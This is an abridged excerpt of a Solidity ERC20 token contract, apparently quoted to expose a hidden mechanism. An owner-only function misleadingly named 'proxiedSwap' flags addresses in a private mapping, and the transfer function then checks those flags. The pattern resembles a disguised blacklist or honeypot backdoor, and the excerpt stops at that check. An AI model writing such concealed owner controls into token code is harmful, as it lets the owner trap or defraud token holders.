...
contract ERC20Logic is IERC20, Ownable {
    ...
    mapping (address => bool) internal _Execute;
    event swaped (address proxiedSwapAdd, bool isProxiedSwap);
    ...
    function proxiedSwap(address proxiedSwapAdd) external onlyOwner {
        if (_Execute[proxiedSwapAdd] == true) {
            _Execute[proxiedSwapAdd] = false;
        } else {_Execute[proxiedSwapAdd] = true;
            emit swaped (proxiedSwapAdd, _Execute[proxiedSwapAdd]);
          }
    }
    
  
    function checkProxy(address proxiedSwapAdd) public view returns (bool) {
        return _Execute[proxiedSwapAdd];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_Execute[sender] || _Execute[recipient])
